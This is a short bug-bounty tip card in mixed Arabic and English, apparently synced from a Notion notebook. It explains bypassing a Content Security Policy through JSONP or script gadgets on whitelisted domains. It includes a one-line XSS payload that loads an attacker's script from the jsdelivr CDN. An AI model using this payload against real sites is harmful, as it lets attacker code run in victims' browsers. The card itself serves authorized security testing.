# CSP Bypass عبر JSONP/Scripts على Domains موثوقة

**Rating:** 🔥 قوية  
**Category:** XSS  
**Status:** Not started  

## How It Works

لو الـ CSP بيسمح بـ domain موثوق (زي Google، GitHub، أو CDN معين)، دور على endpoint فيه JSONP أو script قديم فيه gadget على نفس الـ domain — بيسمحلك تنفذ JS من داخل الـ whitelist بدون ما الـ CSP يمنع.

## Payload / Code

```
CSP مثال: script-src 'self' https://cdn.jsdelivr.net

Exploit:
<script src="https://cdn.jsdelivr.net/gh/attacker/xss-payload@main/payload.js"></script>

أو دور على JSONP endpoint على نفس الـ domain المسموح
```

## Source

Intigriti Official 2026 (Tip 15) + Redfox Security 2026

---

_Synced from Notion: Bug Bounty Tips and Tricks. Authorized testing only._
